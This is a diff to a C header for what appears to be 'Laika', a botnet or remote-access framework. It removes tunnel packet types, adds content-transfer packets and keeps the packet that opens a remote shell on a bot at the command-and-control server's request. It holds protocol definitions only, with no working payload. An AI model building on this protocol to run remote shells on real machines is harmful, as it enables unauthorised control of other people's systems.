@@ -58,30 +58,6 @@ enum {
     /* layout of LAIKAPKT_PINGPONG:
     *   NULL (empty packet)
     */
-    LAIKAPKT_TUNNEL_OPEN, /* if sent to bot, opens a tunnel to localhost's port. if sent to cnc, signifies you opened the tunnel */
-    /* layout of LAIKAPKT_TUNNEL_OPEN:
-    *   uint16_t port;
-    */
-    LAIKAPKT_TUNNEL_CLOSE, /* if sent to bot, closes a tunnel to localhost's port. if sent to cnc, signifies you closed the tunnel */
-    /* layout of LAIKAPKT_TUNNEL_CLOSE:
-    *   uint16_t port;
-    */
-    LAIKAPKT_TUNNEL_CONNECTION_ADD,
-    /* layout of LAIKAPKT_TUNNEL_CONNECTION_ADD:
-    *   uint16_t port;
-    *   uint16_t id;
-    */
-    LAIKAPKT_TUNNEL_CONNECTION_RMV,
-    /* layout of LAIKAPKT_TUNNEL_CONNECTION_RMV:
-    *   uint16_t port;
-    *   uint16_t id;
-    */
-    LAIKAPKT_TUNNEL_CONNECTION_DATA,
-    /* layout of LAIKAPKT_TUNNEL_CONNECTION_RMV:
-    *   uint16_t port;
-    *   uint16_t id;
-    *   uint8_t data[VAR_PACKET_LENGTH-4]; -- '-4' for the port & id
-    */
     LAIKAPKT_SHELL_OPEN, /* if sent to bot, opens a shell. if sent to cnc, signifies you opened a shell */
     /* layout of LAIKAPKT_SHELL_OPEN:
     *   uint32_t id; // this field is absent from the panel/auth client
@@ -95,7 +71,23 @@ enum {
     LAIKAPKT_SHELL_DATA, /* if sent to bot, writes data to stdin of shell. if sent to cnc, writes to 'stdout' of shell */
     /* layout of LAIKAPKT_SHELL_DATA
     *   uint32_t id; // this field is absent from the panel/auth client
-    *   char buf[VAR_PACKET_LENGTH];
+    *   char buf[VAR_PACKET_LENGTH-sizeof(uint32_t)];
+    */
+    LAIKAPKT_CONTENT_NEW,
+    /* layout of LAIKAPKT_CONTENT_NEW:
+    *   uint16_t id;
+    *   uint32_t sz;
+    *   uint8_t type;
+    */
+    LAIKAPKT_CONTENT_ERROR,
+    /* layout of LAIKAPKT_CONTENT_ERROR:
+    *   uint16_t id;
+    *   uint8_t errCode;
+    */
+    LAIKAPKT_CONTENT_CHUNK, /* variadic */
+    /* layout of LAIKAPKT_CONTENT_CHUNK:
+    *   uint16_t id;
+    *   uint8_t buf[VAR_PACKET_LENGTH-sizeof(uint16_t)];
     */
 /* ==================================================[[ Auth ]]================================================== */
     LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, /* second packet sent by authenticated peers (panel). there is no response packet */
